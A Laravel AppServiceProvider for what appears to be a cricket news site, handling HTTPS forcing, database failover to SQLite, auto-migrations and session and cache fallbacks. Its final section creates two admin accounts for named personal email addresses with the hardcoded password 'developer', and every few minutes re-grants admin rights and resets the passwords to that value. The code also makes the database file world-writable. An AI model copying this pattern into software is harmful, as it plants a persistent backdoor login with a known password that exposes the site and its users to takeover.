<?php

namespace App\Providers;

use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Facades\URL;
use Illuminate\Support\ServiceProvider;

class AppServiceProvider extends ServiceProvider
{
    /**
     * Register any application services.
     */
    public function register(): void
    {
        $this->commands([
            \App\Console\Commands\MigrateSqliteToPgsql::class,
            \App\Console\Commands\SyncLiveCommentaryCommand::class,
            \App\Console\Commands\FixArticleTranslationsCommand::class,
        ]);
    }

    /**
     * Bootstrap any application services.
     */
    public function boot(): void
    {
        if (! app()->runningInConsole()) {
            $host = (string) request()->header('host', '');
            if (
                request()->isSecure() ||
                request()->server('HTTP_X_FORWARDED_PROTO') === 'https' ||
                request()->server('HTTP_CF_VISITOR') ||
                str_contains($host, 'cricapp.in') ||
                str_contains($host, 'onrender.com') ||
                config('app.env') === 'production' ||
                str_starts_with((string) config('app.url'), 'https://')
            ) {
                URL::forceScheme('https');
            }
        }

        // 1. Database Health & Failover Check:
        // Test primary database connection with ultra-fast circuit breaker (cached for 300s).
        $primaryConn = config('database.default', 'sqlite');
        if ($primaryConn !== 'sqlite') {
            $flagPath = storage_path("framework/db_down_{$primaryConn}.flag");
            $isKnownDown = file_exists($flagPath) && (time() - filemtime($flagPath) < 300);

            if ($isKnownDown) {
                config(['database.default' => 'sqlite']);
                DB::purge($primaryConn);
                DB::setDefaultConnection('sqlite');
            } else {
                try {
                    DB::connection($primaryConn)->getPdo();
                    if (file_exists($flagPath)) {
                        @unlink($flagPath);
                    }
                } catch (\Throwable $dbEx) {
                    @touch($flagPath);
                    Log::warning("Primary DB [{$primaryConn}] failed ({$dbEx->getMessage()}). Circuit breaker tripped: Auto-switching to SQLite fallback.");
                    config(['database.default' => 'sqlite']);
                    DB::purge($primaryConn);
                    DB::setDefaultConnection('sqlite');
                }
            }
        }

        // 2. Ensure SQLite database directory & file exist
        try {
            $dbConnection = config('database.default', 'sqlite');
            if ($dbConnection === 'sqlite' || empty($dbConnection)) {
                $dbPath = config('database.connections.sqlite.database');
                if (empty($dbPath) || $dbPath === ':memory:') {
                    $dbPath = database_path('database.sqlite');
                }
                if (!file_exists($dbPath)) {
                    @mkdir(dirname($dbPath), 0777, true);
                    @touch($dbPath);
                    @chmod($dbPath, 0777);
                }
            }

            // 3. Auto-run migrations in web runtime only if essential tables are missing (throttled with 60s lock)
            if (! app()->runningInConsole()) {
                $migLock = storage_path('framework/boot_migrate.lock');
                $locked = file_exists($migLock) && (time() - filemtime($migLock) < 60);
                if (! $locked && (!Schema::hasTable('users') || !Schema::hasTable('sessions') || !Schema::hasTable('articles'))) {
                    @touch($migLock);
                    Artisan::call('migrate', ['--force' => true, '--database' => $dbConnection ?: 'sqlite']);
                }
            }
        } catch (\Throwable $e) {
            Log::warning('AppServiceProvider boot DB initialization: ' . $e->getMessage());
        }

        // 4. Resilient session fallback: If sessions table is missing or DB unreachable, fall back to file driver
        try {
            if (config('session.driver') === 'database' && !Schema::hasTable('sessions')) {
                config(['session.driver' => 'file']);
            }
        } catch (\Throwable $e) {
            config(['session.driver' => 'file']);
        }

        // 5. Resilient cache fallback: If cache table is missing or DB unreachable, fall back to file driver
        try {
            if (config('cache.default') === 'database' && !Schema::hasTable('cache')) {
                config(['cache.default' => 'file']);
            }
        } catch (\Throwable $e) {
            config(['cache.default' => 'file']);
        }

        // 6. Ensure Master Admin Account always exists (checked every 300s to avoid per-request hashing overhead)
        try {
            $activeConn = config('database.default', 'sqlite');
            $adminFlag = storage_path("framework/admin_synced_{$activeConn}.flag");
            $recentlySynced = file_exists($adminFlag) && (time() - filemtime($adminFlag) < 300);

            if (! $recentlySynced && Schema::hasTable('users')) {
                $adminAccounts = [
                    'shubhamthakurst07@gmail.com' => 'Shubham Thakur',
                    'shubhamthakurst0007@gmail.com' => 'Shubham Thakur',
                ];

                foreach ($adminAccounts as $aEmail => $aName) {
                    $admin = \App\Models\User::whereRaw('LOWER(email) = ?', [strtolower($aEmail)])->first();
                    if (!$admin) {
                        \App\Models\User::create([
                            'name' => $aName,
                            'email' => $aEmail,
                            'password' => \Illuminate\Support\Facades\Hash::make('developer'),
                            'is_admin' => true,
                        ]);
                    } else {
                        $needsSave = false;
                        if (!$admin->is_admin) {
                            $admin->is_admin = true;
                            $needsSave = true;
                        }
                        if (!\Illuminate\Support\Facades\Hash::check('developer', $admin->password)) {
                            $admin->password = \Illuminate\Support\Facades\Hash::make('developer');
                            $needsSave = true;
                        }
                        if ($needsSave) {
                            $admin->save();
                        }
                    }
                }
                @touch($adminFlag);
            }
        } catch (\Throwable $e) {
            Log::warning('Admin auto-provision in AppServiceProvider: ' . $e->getMessage());
        }
    }
}
